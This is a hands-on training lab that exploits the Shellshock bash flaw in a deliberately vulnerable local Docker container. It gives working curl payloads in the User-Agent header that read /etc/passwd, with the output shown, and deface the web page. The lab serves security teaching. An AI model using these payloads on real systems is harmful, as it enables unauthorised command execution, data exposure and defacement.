## Vulnerable/Outdated Libraries - Shell-Shock (Bashdoor) 

###### Some containers that are often used and available on `dockerhub` are not updated regularly, which results in them having vulnerable packages and libraries. Shellshock is one such vulnerability found in older versions of bash that haven't been updated.

##### Step 1:

* Open Terminal

	![](img/Open-Terminal.png)


##### Step 2:

* Run the image vulnerable to shell-shock by running `docker run -d -it -p 8080:80 vulnerables/cve-2014-6271`

    ```commandline
    root@we45:~# docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
    208ee69b40e260c5605cde5faca67e0428c7fe80a237b5cd5767f9e2e734f03d
    root@we45:~#
    ```


##### Step 3:

* Open the browser and go to `http://localhost:8080` to verify if the application is running.

![](img/shellshock-browser.png)


##### Step 4:

* Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable` to exploit the vulnerability and access the `/etc/passwd` file on the vulnerable container.

```commandline
root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```


##### Step 5:

* Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable` to deface the website.

```commandline
root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable
```


##### Step 6:

* Access `http://localhost:8080` on browser to confirm.

![](img/defaced.png)


##### Stop all running docker containers

* Run `clean-docker` to stop all the containers

```commandline
root@we45:~$ clean-docker
```

